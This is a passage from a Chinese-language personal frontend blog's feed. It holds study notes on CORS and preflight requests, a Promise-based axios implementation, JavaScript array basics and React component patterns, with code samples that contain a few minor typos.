在发送请求时，附加一个Origin请求头，值为请求页面的源信息(协议，域名和端口)，以便服务器根据这个头部信息来决定是否给予响应。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Origin"</span>, <span class="string">"http://www.nczonline.net"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Firefox, safari, chrome无需额外编写代码，就可以触发CORS行, IE要用XDR对象</span></span><br><span class="line"><span class="comment">// xhr.open()里传入绝对url</span></span><br><span class="line">xhr.open(<span class="string">"get"</span>, <span class="string">"http://www.somewhere-else.com/page/"</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure></p><p>如果服务器认为这个请求可以接受，就在<em><code>Access-Control-Allow-Origin</code></em>头部中返回相同的源信息。注意：请求和响应都不包含cookie信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://www.nczonline.net</span><br></pre></td></tr></table></figure></p><p>CORS存在一些安全限制</p><ul><li>不能使用setRequestHeader()设置自定义头部</li><li>不能发送和接收cookie</li><li>调用getAllResponseHeaders()方法总会返回空字符串</li></ul><p><br></p><h5 id="1-7-2-Preflighted-Request"><a href="#1-7-2-Preflighted-Request" class="headerlink" title="1.7.2 Preflighted Request"></a>1.7.2 Preflighted Request</h5><p>CORS 通过一种叫做 Preflighted Requests 的透明服务器验证机制<em>支持开发人员使用自定义的头部、 GET 或 POST 之外的方法，以及不同类型的主体内容</em>。在使用下列高级选项来发送请求时，就会向服务 器发送一个 Preflight 请求。这种请求使用 OPTIONS 方法，发送下列头部。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Origin:与简单的请求相同。</span><br><span class="line">Access-Control-Request-Method:请求自身使用的方法。</span><br><span class="line">Access-Control-Request-Headers:(可选)自定义的头部信息，多个头部以逗号分隔。</span><br></pre></td></tr></table></figure></p><p>服务器通过响应中返回如下头部<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin:与简单的请求相同。</span><br><span class="line">Access-Control-Allow-Methods:允许的方法，多个方法以逗号分隔。</span><br><span class="line">Access-Control-Allow-Headers:允许的头部，多个头部以逗号分隔。</span><br><span class="line">Access-Control-Max-Age:应该将这个 Preflight 请求缓存多长时间(以秒表示)。</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="1-7-3-withCredentials"><a href="#1-7-3-withCredentials" class="headerlink" title="1.7.3 withCredentials"></a>1.7.3 withCredentials</h5><p>默认情况下，跨源资源不提供凭据(cookie, HTTP认证，SSL证明)。通过将<em><code>withCredential</code></em>属性设为true, 可以指定某个请求应该发送凭证。如果服务端接受凭据的请求，会用下面的HTTP头部来响应。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure></p><p>如果服务器的响应中没有包含这个头部，那么浏览器就不会把响应交给 JavaScript(于是，responseText 中将是空字符串，status 的值为 0，而且会调用 onerror()事件处 理程序)。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createCORSRequest</span>(<span class="params">method, url</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  <span class="keyword">if</span> (<span class="string">"withCredentials"</span> <span class="keyword">in</span> xhr)&#123;</span><br><span class="line">    xhr.open(method, url, <span class="literal">true</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> XDomainRequest != <span class="string">"undefined"</span>)&#123;</span><br><span class="line">    xhr = <span class="keyword">new</span> XDomainRequest();</span><br><span class="line">    xhr.open(method, url); </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    xhr = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> xhr; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> request = createCORSRequest(<span class="string">"get"</span>,<span class="string">"http://www.somewhere-else.com/page/"</span>); </span><br><span class="line">request.send();</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="1-7-4-其他跨域技术"><a href="#1-7-4-其他跨域技术" class="headerlink" title="1.7.4 其他跨域技术"></a>1.7.4 其他跨域技术</h5><p><br></p><h3 id="2-实现Axios"><a href="#2-实现Axios" class="headerlink" title="2. 实现Axios"></a>2. 实现Axios</h3><p>用Promise实现一个简单的axios<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Axios</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; url, method, data &#125; = obj;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.open(method, url);</span><br><span class="line">    xhr.onreadystatechange = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (xhr.readyState !== <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">        resolve(xhr.response)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        reject(xhr.statuText)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.send(data);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>使用的时候就可以用<code>.then()</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  url: <span class="string">'https://cnodejs.org/api/v1/topics'</span>,</span><br><span class="line">  method: <span class="string">'GET'</span>,</span><br><span class="line">  data: <span class="string">''</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">axios(obj)</span><br><span class="line">  .then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response)</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.jianshu.com/p/874350b5aee7" target="_blank" rel="noopener">JS: 用 Promise 写一个 axios</a></li><li>《Javascript高级程序设计》XMLHttpRequest</li><li><a href="https://juejin.im/post/5aedd4a2f265da0b9d781b85" target="_blank" rel="noopener">如何实现一个HTTP请求库——axios源码阅读与分析</a></li><li><a href="https://juejin.im/post/5d5ccdd75188255625591357" target="_blank" rel="noopener">axios如何利用promise无痛刷新token</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JS基本操作</title>
      <link href="/2019/06/25/JS%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2019/06/25/JS%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      <content type="html"><![CDATA[<h3 id="1-数组"><a href="#1-数组" class="headerlink" title="1. 数组"></a>1. 数组</h3><p>数组的标准定义是：一个存储元素的线性集合，元素可以通过索引来任意存取，索引通常是数字，用来计算元素之间存储位置的偏移量。</p><p>Javascript中的数组是一个特殊的对象，用来表示偏移量的索引是该对象的属性，索引可能是整数。然而，这些数字索引在内部被转换为字符串类型，这是因为Javascript对象中的属性名必须是字符串。数组是Javascript中只是一种特殊的对象，所以效率上不如其他语言中的数组高。</p><ul><li><p>创建数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">10</span>);  <span class="comment">// arr.length === 10</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="string">'Joe'</span>, <span class="literal">null</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray(arr);  <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串生成数组</span></span><br><span class="line"><span class="keyword">var</span> sentence = <span class="string">"the quick brown fox jumped over"</span>;</span><br><span class="line"><span class="keyword">var</span> arr = sentence.split(<span class="string">" "</span>); <span class="comment">// ["the", "qucik"...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组的字符串表示</span></span><br><span class="line">arr.join();     <span class="comment">// 1,2,3</span></span><br><span class="line">arr.toString(); <span class="comment">// 1,2,3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由已有的数组创建新数组</span></span><br><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];</span><br><span class="line"><span class="keyword">var</span> arr3 = arr1.concat(arr2);</span><br><span class="line"><span class="comment">// arr1保持不变 [1,2,3]  arr2 [4,5,6]  arr3 [1,2,3,4,5,6]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr4 = arr1.splice(<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line"><span class="comment">// arr1 保持不变, arr4 [2,3]</span></span><br></pre></td></tr></table></figure></li><li><p>复制数组<br>当一个数组赋给另外一个数组时，只是为被赋值的数组增加了一个新的引用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 浅复制: </span></span><br><span class="line"><span class="keyword">var</span> arr2 = arr1;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 深复制</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepCopy</span>(<span class="params">arr1, arr2</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr1.length; ++i)&#123;</span><br><span class="line">    arr2[i] = arr1[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>查找元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查找数组</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>];</span><br><span class="line">arr.indexOf(<span class="number">1</span>);     <span class="comment">// 0 </span></span><br><span class="line">arr.lastIndexOf(<span class="number">1</span>)  <span class="comment">// 3</span></span><br><span class="line">arr.indexOf(<span class="number">5</span>);     <span class="comment">// -1</span></span><br></pre></td></tr></table></figure></li><li><p>改变数组内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var arr = [1,2,3]</span><br></pre></td></tr></table></figure></li></ul><p><a href="https://juejin.im/post/5c9c3989e51d454e3a3902b6" target="_blank" rel="noopener">https://juejin.im/post/5c9c3989e51d454e3a3902b6</a><br><a href="https://juejin.im/post/5a2a7a5051882535cd4abfce" target="_blank" rel="noopener">https://juejin.im/post/5a2a7a5051882535cd4abfce</a></p>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>浏览器缓存</title>
      <link href="/2019/06/24/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98/"/>
      <url>/2019/06/24/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98/</url>
      <content type="html"><![CDATA[<p><a href="https://juejin.im/post/5c4528a6f265da611a4822cc" target="_blank" rel="noopener">https://juejin.im/post/5c4528a6f265da611a4822cc</a></p>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CSS可视化格式模型</title>
      <link href="/2019/06/22/CSS%E5%8F%AF%E8%A7%86%E5%8C%96%E6%A0%BC%E5%BC%8F%E6%A8%A1%E5%9E%8B/"/>
      <url>/2019/06/22/CSS%E5%8F%AF%E8%A7%86%E5%8C%96%E6%A0%BC%E5%BC%8F%E6%A8%A1%E5%9E%8B/</url>
      <content type="html"><![CDATA[<p>71615601950826</p>]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React组件 &amp; 组件传值</title>
      <link href="/2019/06/21/React%E7%BB%84%E4%BB%B6/"/>
      <url>/2019/06/21/React%E7%BB%84%E4%BB%B6/</url>
      <content type="html"><![CDATA[<h3 id="1-常用组件"><a href="#1-常用组件" class="headerlink" title="1. 常用组件"></a>1. 常用组件</h3><p>组件允许你将UI拆分为独立可复用的代码片段，并对每个片段进行独立构思。组件，从概念上类似于Javascript函数。它接受任意的入参(props)，并返回用于描述页面展示内容的React元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DOM标签</span></span><br><span class="line"><span class="keyword">const</span> element = <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义组件</span></span><br><span class="line"><span class="keyword">const</span> element1 = <span class="xml"><span class="tag">&lt;<span class="name">Welcome</span> <span class="attr">name</span>=<span class="string">"Sara"</span>&gt;</span><span class="tag">&lt;/<span class="name">Welocme</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// class组件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello, &#123;this.props.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数组件: 定义组件最简单的方式就是编写javascript函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">App</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;Welcome name=<span class="string">"Sara"</span> /&gt;</span><br><span class="line">      &lt;Welcome name=<span class="string">"Cahal"</span> /&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="1-1-条件渲染"><a href="#1-1-条件渲染" class="headerlink" title="1.1 条件渲染"></a>1.1 条件渲染</h4><ul><li><p>与运算符 &amp;&amp;</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Mailbox</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> unreadMessage = props.unreadMessage;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &#123;unreadMessage.length &gt; <span class="number">0</span> &amp;&amp; </span><br><span class="line">        &lt;h2&gt;you have &#123;unreadMessage.length&#125; unread message.&lt;<span class="regexp">/h2&gt;</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>三目运算符</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">render() &#123;</span><br><span class="line">  <span class="keyword">const</span> isLoggedIn = <span class="keyword">this</span>.state.isLoggedIn;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &#123;isLoggedIn ? (</span><br><span class="line">        &lt;LogoutBtn /&gt;</span><br><span class="line">      ) : (</span><br><span class="line">        &lt;LoginBtn /&gt;</span><br><span class="line">      )&#125;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="1-2-列表渲染"><a href="#1-2-列表渲染" class="headerlink" title="1.2 列表渲染"></a>1.2 列表渲染</h4><p><em><code>Array.map</code></em>实现列表渲染，key帮助React识别哪些元素改变了，比如被添加或删除。数组元素中使用的key在其兄弟节点之间应该是独一无二的。然而，它们不需要是全局唯一的，当我们生成两个不同的数组时，我们可以使用相同的key。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">NumberList</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> items = props.items;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &#123;items.map(item, index) =&gt; </span><br><span class="line">        &lt;li key=&#123;item.id&#125;&gt;&#123;item.text&#125;&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">    &lt;/u</span>l&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="1-3-表单组件"><a href="#1-3-表单组件" class="headerlink" title="1.3 表单组件"></a>1.3 表单组件</h4><p>表单元素的工作方式和其他的DOM元素有些不同，表单元素通常会保持一些内部的state。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// 表单元素状态由使用者维护</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">  <span class="attr">type</span>=<span class="string">"text"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">value</span>=<span class="string">&#123;this.state.value&#125;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onChange</span>=<span class="string">&#123;(e)</span> =&gt;</span> this.setState(&#123; value: e.target.value &#125;)&#125;</span><br><span class="line">/&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">value</span>=<span class="string">&#123;this.state.value&#125;</span> <span class="attr">onChange</span>=<span class="string">&#123;this.handleChange&#125;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 表单元素状态DOM自身维护</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">  <span class="attr">type</span>=<span class="string">"text"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">ref</span>=<span class="string">&#123;node</span> =&gt;</span> this.input = node&#125;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-4-props-children"><a href="#1-4-props-children" class="headerlink" title="1.4 props.children"></a>1.4 props.children</h4><p>有些组件无法提前知道它们子组件的具体内容。通过<em><code>props.children</code></em>可以将他们的子组件渲染到结果中。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FancyBorder</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div className=&#123;<span class="string">'FancyBorder-'</span> + props.color&#125;&gt;</span><br><span class="line">      &#123;props.children&#125;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">function WelcomeDialog() &#123;</span></span><br><span class="line"><span class="regexp">  return (</span></span><br><span class="line"><span class="regexp">    &lt;FancyBorder color="blue"&gt;</span></span><br><span class="line"><span class="regexp">      &lt;h1&gt;welcome&lt;/</span>h1&gt;</span><br><span class="line">      &lt;p&gt;Thank <span class="keyword">for</span> coming!<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">    &lt;<span class="regexp">/FancyBorder&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><h4 id="1-5-React-lazy-与-Suspense"><a href="#1-5-React-lazy-与-Suspense" class="headerlink" title="1.5 React.lazy 与 Suspense"></a>1.5 React.lazy 与 Suspense</h4><p><code>React.lazy</code>能让你像渲染常规组件一样处理动态引入。你可以将<code>Suspense</code>组件置于懒加载组件之上的任何位置，<code>fallback</code>属性接受任何在组件加载过程中你想展示的React元素。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> OtherComponent = React.lazy(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'./OtherComponent'</span>));</span><br><span class="line"><span class="keyword">const</span> AnotherComponent = React.lazy(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'./AnotherComponent'</span>));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MyComponent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;Suspense fallback=&#123;&lt;div&gt;Loading...&lt;<span class="regexp">/div&gt;&#125;&gt;</span></span><br><span class="line"><span class="regexp">        &lt;OtherComponent /</span>&gt;</span><br><span class="line">        &lt;AnotherComponent /&gt;</span><br><span class="line">      &lt;<span class="regexp">/Suspense&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>配合React Router,基于路由进行代码分割<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; BrowserRouter <span class="keyword">as</span> Router, Route, Switch &#125; <span class="keyword">from</span> <span class="string">'react-router-dom'</span>;</span><br><span class="line"><span class="keyword">import</span> React, &#123; Suspense, lazy &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Home = lazy(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'./routes/Home'</span>));</span><br><span class="line"><span class="keyword">const</span> About = lazy(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'./routes/About'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> (</span><br><span class="line">  &lt;Route&gt;</span><br><span class="line">    &lt;Suspense fallback=&#123;&lt;div&gt;Loading...&lt;<span class="regexp">/div&gt;&#125;&gt;</span></span><br><span class="line"><span class="regexp">      &lt;Switch&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Route exact path="/</span><span class="string">" component=&#123;Home&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Route path="</span>/about<span class="string">" component=&#123;About&#125; /&gt;</span></span><br><span class="line"><span class="string">      &lt;/Switch&gt;</span></span><br><span class="line"><span class="string">    &lt;/Suspense&gt;</span></span><br><span class="line"><span class="string">  &lt;/Router&gt;</span></span><br><span class="line"><span class="string">)</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-6-Fragments"><a href="#1-6-Fragments" class="headerlink" title="1.6 Fragments"></a>1.6 